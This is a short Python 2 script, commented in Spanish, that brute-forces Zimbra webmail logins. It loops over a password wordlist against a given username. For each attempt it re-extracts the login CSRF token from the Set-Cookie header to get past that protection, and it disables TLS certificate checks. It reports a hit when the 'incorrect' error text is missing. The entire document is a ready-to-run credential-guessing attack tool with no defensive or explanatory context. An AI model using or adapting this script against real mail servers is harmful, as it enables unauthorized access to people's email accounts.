# script para bf zimbra webmail con csrf_token

#!/usr/bin/env python
import requests
import sys
import thread
import substring
from bs4 import BeautifulSoup as bs4

session = requests.Session()
requests.packages.urllib3.disable_warnings()

url = sys.argv[1]
user = sys.argv[2]
password_file = "wordlist.txt"

def atacar(tk):
    token = tk
    with open(password_file) as f:
        for passw in f.readlines():
               passw = passw.replace('\n', '')
               cookies = {'ZM_TEST':'true', 'ZM_LOGIN_CSRF':token}
               post = {'loginOp': 'login', 'username': user,'login_csrf': token, 'password': str(passw), 'client': 'preferred'}
               r = session.post(url, post, cookies=cookies, verify=False)
               inicio = r.headers['Set-Cookie'].index('F=')+1
               fin = r.headers['Set-Cookie'].index(';', inicio)
               s = r.headers['Set-Cookie'][inicio:fin]
               token = s[1:]
               if "son incorrectos" not in r.content and "username or password is incorrect" not in r.content:
                     print "Login correcto. Password: "+passw

if __name__ == "__main__":
   r = session.get(url, verify=False)
   inicio = r.headers['Set-Cookie'].index('F=')+1
   fin = r.headers['Set-Cookie'].index(';', inicio)
   s = r.headers['Set-Cookie'][inicio:fin]
   token = s[1:]
   tk = token
   atacar(tk)

